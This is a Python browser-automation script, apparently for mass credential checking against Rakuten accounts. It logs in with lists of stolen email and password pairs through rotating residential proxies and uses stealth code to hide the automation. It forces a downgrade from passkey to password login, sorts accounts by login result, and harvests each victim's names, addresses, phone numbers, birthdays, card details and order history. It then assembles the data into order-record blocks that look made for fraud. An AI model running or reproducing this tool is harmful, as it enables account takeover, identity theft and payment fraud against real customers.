import os
import sys
import json
import time
import re
import random
import argparse
import traceback
from pathlib import Path
from playwright.sync_api import sync_playwright

OUTPUT_DIR = Path('/opt/run_batch_1061')
SNAPS_DIR = OUTPUT_DIR / 'screenshots'
SNAPS_DIR.mkdir(parents=True, exist_ok=True)

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
window.navigator.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };
"""

def clean(txt):
    return (txt or '').strip()

def clear_overlays(page):
    try:
        page.evaluate("""() => {
            const ids = ['onetrust-banner-sdk', 'onetrust-consent-sdk', 'cookie-banner'];
            for (const id of ids) {
                const el = document.getElementById(id);
                if (el) el.remove();
            }
            const modalOverlays = document.querySelectorAll('.ot-fade-in, [class*="modal-backdrop"], [class*="overlay"]');
            for (const m of modalOverlays) {
                m.remove();
            }
        }""")
    except Exception:
        pass

def take_safe_screenshot(page, path, full_page=False):
    try:
        page.screenshot(path=str(path), full_page=full_page, timeout=8000)
    except Exception as e:
        print(f"  ⚠️ 截屏略过: {e}", flush=True)

def handle_prompts_and_skips(page):
    try:
        clear_overlays(page)
        skip_clicked = page.evaluate("""() => {
            for (const el of document.querySelectorAll('button, a, div[role="button"]')) {
                const txt = el.innerText ? el.innerText.trim() : '';
                if (txt.includes('スキップしてログイン') || txt.includes('後で設定する')) {
                    el.click();
                    return true;
                }
            }
            return false;
        }""")
        if skip_clicked:
            print("  ⏩ 发现拦截弹窗，已自动点击【スキップしてログイン】", flush=True)
            time.sleep(3.0)
    except Exception:
        pass

def resilient_goto(page, url, wait_selector=None, max_retries=2, timeout=25000):
    for attempt in range(max_retries):
        try:
            page.goto(url, wait_until='domcontentloaded', timeout=timeout)
            handle_prompts_and_skips(page)
            if wait_selector:
                try:
                    page.wait_for_selector(wait_selector, timeout=6000, state='attached')
                except Exception:
                    pass
            time.sleep(2.0)
            handle_prompts_and_skips(page)
            return True
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(2.0)
            else:
                return False
    return False

def load_random_proxy(proxy_file="data/proxy_pool.txt"):
    """从动态代理池中随机抽取一个日本原生住宅代理"""
    if not proxy_file or not os.path.exists(proxy_file):
        return None
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f if l.strip()]
        if not lines:
            return None
        p_str = random.choice(lines)
        parts = p_str.split(':')
        if len(parts) == 4:
            return {
                'server': f"http://{parts[0]}:{parts[1]}",
                'username': parts[2],
                'password': parts[3]
            }
    except Exception as e:
        print(f"  ⚠️ 加载代理失败: {e}", flush=True)
    return None

def extract_single_account(acc, worker_id=0, proxy_file="data/proxy_pool.txt"):
    email = acc['email']
    pwd = acc['password']
    row_idx = acc.get('row_idx', 0)
    safe_acc = email.replace('@', '_').replace('.', '_')
    
    print(f"\n==================================================================", flush=True)
    print(f"🚀 [1061批次 · Worker-{worker_id}] 开始提取: {email} (行号 {row_idx})", flush=True)
    print(f"==================================================================", flush=True)
    
    res = {
        'row_idx': row_idx,
        'account_id': email,
        'email': email,
        'password': pwd,
        'status': 'unknown',
        'profile': {
            'last_name': '', 'first_name': '',
            'last_name_kana': '', 'first_name_kana': '',
            'full_name': '', 'kana_name': '',
            'birthday': '', 'gender': '',
            'postal_code': '', 'address': '', 'phone': '',
            'card_brand': '', 'card_last4': '', 'card_holder': '', 'card_info': ''
        },
        'order_count': 0,
        'raw_orders': [],
        'bana_orders': []
    }
    
    proxy_config = load_random_proxy(proxy_file)
    if proxy_config:
        print(f"  🌐 挂载日本动态代理: {proxy_config['server']} (出口节点: {proxy_config['username'][:28]}...)", flush=True)
        
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            proxy=proxy_config,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--lang=ja-JP'
            ]
        )
        context = browser.new_context(
            locale='ja-JP',
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        )
        context.add_init_script(STEALTH_JS)
        page = context.new_page()
        page.set_default_timeout(30000)
        
        # 1. 官方 SSO 登录
        auth_url = "https://login.account.rakuten.com/sso/authorize?client_id=my_data_japan&response_type=code&scope=openid%20email%20profile&redirect_uri=https://mydata.id.rakuten.co.jp/mydata-api/auth/postlogin"
        resilient_goto(page, auth_url, wait_selector='input#user_id, input[type="text"]', timeout=30000)
        clear_overlays(page)
        
        u_in = page.locator('input#user_id, input[type="text"]').first
        if not u_in.is_visible():
            time.sleep(2.0)
            u_in = page.locator('input#user_id, input[type="text"]').first
            
        if not u_in.is_visible():
            res['status'] = 'page_load_error'
            print(f"  ❌ 用户名输入框未就绪", flush=True)
            browser.close()
            return res
            
        u_in.fill(email)
        btn_next = page.locator('button:has-text("次へ"), button[type="submit"]').first
        if btn_next.count() > 0 and btn_next.is_visible():
            btn_next.click()
        else:
            u_in.press('Enter')
        time.sleep(2.5)
        
        body_txt = page.locator('body').inner_text() or ''
        if 'パスキー' in body_txt or 'webauthn' in page.url:
            print("  ⚠️ 检测到通行密钥拦截，尝试降级...", flush=True)
            switch_btn = page.locator('button:has-text("パスワード"), a:has-text("パスワード"), button:has-text("別の方法")').first
            if switch_btn.count() > 0 and switch_btn.is_visible():
                switch_btn.click()
                time.sleep(2.5)
                
        p_in = page.locator('input[type="password"], #password_current').first
        if p_in.count() > 0 and p_in.is_visible():
            p_in.fill(pwd)
            btn_login = page.locator('button:has-text("ログイン"), button[type="submit"]').first
            if btn_login.count() > 0 and btn_login.is_visible():
                btn_login.click()
            else:
                p_in.press('Enter')
        else:
            print("  ⚠️ 未探测到可见密码输入框", flush=True)
            
        for _ in range(6):
            time.sleep(2.0)
            handle_prompts_and_skips(page)
            if 'postlogin' in page.url or 'order-list' in page.url or 'profile.id.rakuten.co.jp' in page.url:
                break
                
        body_txt = page.locator('body').inner_text() or ''
        if 'ユーザIDまたはパスワードが正しくありません' in body_txt or '入力内容をご確認ください' in body_txt:
            res['status'] = 'wrong_password'
            print(f"  ❌ 密码错误", flush=True)
            browser.close()
            return res
        if 'ワンタイムパスワード' in body_txt or '2段階認証' in body_txt:
            res['status'] = 'two_factor'
            print(f"  ⚠️ 需2FA验证码", flush=True)
            browser.close()
            return res
            
        res['status'] = 'active'
        print(f"  ✅ 登录鉴权成功！开始进入核心数据深度萃取...", flush=True)
        
        # 2. 购买履历优先萃取 (purchase-history/order-list)
        resilient_goto(page, 'https://order.my.rakuten.co.jp/purchase-history/order-list', max_retries=2)
        clear_overlays(page)
        handle_prompts_and_skips(page)
        time.sleep(3.0)
        
        snap_ord = SNAPS_DIR / f"{safe_acc}_orders.png"
        take_safe_screenshot(page, snap_ord, full_page=True)
        
        page_txt = page.locator('main, body').first.inner_text() or ''
        
        m_hdr = re.search(r'([^\s\n\r]+)\s+([^\s\n\r]+)\s*さん\s*利用可能ポイント', page_txt)
        if not m_hdr:
            m_hdr = re.search(r'([^\s\n\r]+)\s+([^\s\n\r]+)\s*さん', page_txt)
        if m_hdr:
            res['profile']['last_name'] = m_hdr.group(1)
            res['profile']['first_name'] = m_hdr.group(2)
            res['profile']['full_name'] = f"{m_hdr.group(1)} {m_hdr.group(2)}"
            print(f"  👤 [官方Header提取姓名] {res['profile']['full_name']}", flush=True)
            
        ord_num_re = re.compile(r'(\d{6}-\d{8}-\d{8})')
        date_re = re.compile(r'(\d{4}[/\-年]\d{1,2}[/\-月]\d{1,2}[^\n]*)')
        price_re = re.compile(r'([\d,]+)\s*円')
        
        lines = [l.strip() for l in page_txt.split('\n') if l.strip()]
        indices = []
        for idx, line in enumerate(lines):
            m = ord_num_re.search(line)
            if m:
                indices.append((idx, m.group(1)))
                
        orders_extracted = []
        for i, (idx, ord_no) in enumerate(indices):
            start_w = max(0, idx - 4)
            end_w = min(len(lines), idx + 8)
            window = lines[start_w:end_w]
            
            ord_date = ''
            for w in window:
                dm = date_re.search(w)
                if dm:
                    ord_date = dm.group(1).replace('年', '/').replace('月', '/')
                    break
                    
            price = ''
            for w in window:
                if '注文番号' in w or '注文日' in w:
                    continue
                pm = price_re.search(w)
                if pm:
                    val = pm.group(1)
                    if val not in ['1,980', '1980', '2024', '2025', '2026', '2023', '2022', '30,000']:
                        price = val + '円'
                        break
            if not price:
                for w in window:
                    pm = price_re.search(w)
                    if pm:
                        price = pm.group(1) + '円'
                        break
                        
            shop = 'その他'
            for w in window[:idx - start_w]:
                if any(x in w for x in ['ショップ', '公式', '店', 'Market', 'Store', 'LOVE', 'Love', '堂', '屋', '舎', '倶楽部']):
                    shop = w
                    break
            if shop == 'その他' and window:
                candidate = window[0]
                if not ord_num_re.search(candidate) and '注文' not in candidate:
                    shop = candidate
                    
            item = '商品'
            for w in window[idx - start_w + 1:]:
                if len(w) > 4 and '注文' not in w and not price_re.search(w) and '数量' not in w:
                    item = w
                    break
                    
            orders_extracted.append({
                'order_number': ord_no,
                'order_date': ord_date or '2023/01/01',
                'shop_name': shop,
                'item_name': item,
                'price_yen': price or '1,000円',
                'quantity': '1'
            })
            
        res['order_count'] = len(orders_extracted)
        res['raw_orders'] = orders_extracted
        print(f"  📦 [購入履歴] 提取到 {len(orders_extracted)} 笔官方真实订单", flush=True)
        
        # 3. 注文詳細无感提取真实地址、电话与信用卡
        if indices:
            try:
                detail_clicked = page.evaluate("""() => {
                    for (const a of document.querySelectorAll('a')) {
                        if (a.innerText && a.innerText.trim() === '注文詳細') {
                            const rect = a.getBoundingClientRect();
                            if (rect.width > 0 && rect.height > 0) {
                                a.click();
                                return true;
                            }
                        }
                    }
                    return false;
                }""")
                if detail_clicked:
                    time.sleep(3.5)
                    snap_detail = SNAPS_DIR / f"{safe_acc}_order_detail.png"
                    take_safe_screenshot(page, snap_detail, full_page=True)
                    det_txt = page.locator('body').inner_text() or ''
                    
                    m_post = re.search(r'(〒\s*\d{3}-\d{4})', det_txt)
                    if m_post:
                        res['profile']['postal_code'] = m_post.group(1).replace(' ', '')
                        
                    m_phone = re.search(r'(0\d{1,4}-\d{1,4}-\d{3,4}|0[789]0\d{8})', det_txt)
                    if m_phone:
                        res['profile']['phone'] = m_phone.group(1)
                        
                    m_addr_block = re.search(r'お届け先\s*\n+([^\n]+)\s*\n+(〒\s*\d{3}-\d{4})\s*\n+([^\n]+)\s*\n+([^\n]+)', det_txt)
                    if not m_addr_block:
                        m_addr_block = re.search(r'注文者情報\s*\n+([^\n]+)\s*\n+(〒\s*\d{3}-\d{4})\s*\n+([^\n]+)\s*\n+([^\n]+)', det_txt)
                    if m_addr_block:
                        recip_name = m_addr_block.group(1).strip()
                        p_code = m_addr_block.group(2).strip()
                        pref_city = m_addr_block.group(3).strip()
                        street = m_addr_block.group(4).strip()
                        ph = res['profile']['phone']
                        res['profile']['address'] = f"{p_code}\n{pref_city}\n{street}\n{ph}".strip()
                        print(f"  🏠 [注文詳細提取官方地址]\n{res['profile']['address']}", flush=True)
                        if not res['profile']['full_name']:
                            res['profile']['full_name'] = recip_name
                            
                    m_card = re.search(r'([A-Za-z]+)\s*\*+\s*(\d{4})', det_txt)
                    if m_card:
                        res['profile']['card_brand'] = m_card.group(1)
                        res['profile']['card_last4'] = m_card.group(2)
                        res['profile']['card_info'] = f"{m_card.group(1)} **** {m_card.group(2)}"
                        print(f"  💳 [注文詳細提取官方信用卡] {res['profile']['card_info']}", flush=True)
                        
                    m_holder = re.search(r'([A-Z\s]{4,30})\s*\n*有効期限\s*:\s*\d{2}/\d{4}', det_txt)
                    if m_holder:
                        res['profile']['card_holder'] = m_holder.group(1).strip()
            except Exception as e:
                print("  ⚠️ 订单详情提取略过:", e, flush=True)
                
        # 4. 若姓名或地址仍为空，轻量探测基本信息 (6 秒快速防卡)
        if not res['profile']['full_name'] or not res['profile']['address']:
            try:
                page.goto('https://profile.id.rakuten.co.jp/personal-information', wait_until='domcontentloaded', timeout=10000)
                handle_prompts_and_skips(page)
                time.sleep(2.0)
                b_txt = page.locator('body').inner_text() or ''
                if not res['profile']['full_name']:
                    m_h = re.search(r'([^\s\n\r]+)\s+([^\s\n\r]+)\s*さん', b_txt)
                    if m_h:
                        res['profile']['full_name'] = f"{m_h.group(1)} {m_h.group(2)}"
                m_bday = re.search(r'生年月日[^\d]*(\d{4}[年/\-]\d{1,2}[月/\-]\d{1,2})', b_txt)
                if m_bday:
                    res['profile']['birthday'] = m_bday.group(1).replace('年', '/').replace('月', '/')
                if '男性' in b_txt: res['profile']['gender'] = '男性'
                elif '女性' in b_txt: res['profile']['gender'] = '女性'
            except Exception:
                pass
                
        # 5. 组装 Bana 8 要素法定订单块
        target_name = res['profile']['full_name']
        target_kana = res['profile']['kana_name']
        target_card = res['profile']['card_info']
        target_holder = res['profile']['card_holder'] or target_name
        
        target_addr_block = res['profile']['address']
        addr_part = f"\n{target_addr_block}" if target_addr_block else ""
        card_part = f"\n{target_card}\n{target_holder}" if target_card else ""
            
        bana_blocks = []
        for o in orders_extracted[:3]:
            block = (
                f"{o['shop_name']}\n"
                f"注文日時：\n{o['order_date']}\n"
                f"注文番号：\n{o['order_number']} | {o['item_name']} | {o['price_yen']} | 数量：\n{o['quantity']} | "
                f"お届け先\n{target_name}{addr_part} | "
                f"注文者情報\n{target_name}{addr_part}\n{email} | "
                f"支払い方法\nクレジットカード決済(一括払い){card_part}"
            )
            bana_blocks.append(block)
        res['bana_orders'] = bana_blocks
        
        browser.close()
        return res

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--worker-id', type=int, default=0, help='Worker index (0, 1, 2)')
    parser.add_argument('--num-workers', type=int, default=1, help='Total workers on this machine')
    args = parser.parse_args()
    
    part_file = OUTPUT_DIR / 'accounts.json'
    if not part_file.exists():
        print("未找到 accounts.json", flush=True)
        return
        
    with open(part_file, 'r', encoding='utf-8') as f:
        all_accounts = json.load(f)
        
    my_accounts = [acc for idx, acc in enumerate(all_accounts) if idx % args.num_workers == args.worker_id]
    res_file = OUTPUT_DIR / f"results_batch_1061_w{args.worker_id}.json"
    
    done_emails = set()
    for existing_file in OUTPUT_DIR.glob('results_batch_1061*.json'):
        try:
            with open(existing_file, 'r', encoding='utf-8') as f:
                d = json.load(f)
                for r in d:
                    done_emails.add(r['email'])
        except Exception:
            pass
            
    my_results = []
    if res_file.exists():
        try:
            with open(res_file, 'r', encoding='utf-8') as f:
                my_results = json.load(f)
        except Exception:
            my_results = []
            
    print(f"Worker-{args.worker_id} 启动！总任务 {len(my_accounts)} 户，已跳过 {len(done_emails)} 户", flush=True)
    
    for i, acc in enumerate(my_accounts, 1):
        if acc['email'] in done_emails:
            continue
        try:
            r = extract_single_account(acc, worker_id=args.worker_id)
            my_results.append(r)
        except Exception as e:
            print(f"❌ 账号 {acc['email']} 发生未捕获异常: {e}", flush=True)
            traceback.print_exc()
            my_results.append({
                'row_idx': acc.get('row_idx', 0),
                'account_id': acc['email'],
                'email': acc['email'],
                'password': acc['password'],
                'status': 'error',
                'error_msg': str(e),
                'profile': {},
                'order_count': 0,
                'raw_orders': [],
                'bana_orders': []
            })
            
        with open(res_file, 'w', encoding='utf-8') as f:
            json.dump(my_results, f, ensure_ascii=False, indent=2)
            
        done_emails.add(acc['email'])
        print(f"💾 [Worker-{args.worker_id} 进度 {i}/{len(my_accounts)}] 已保存", flush=True)
        time.sleep(1.5)
        
    print(f"🎉 Worker-{args.worker_id} 专属账号全量处理完成！", flush=True)

if __name__ == '__main__':
    main()
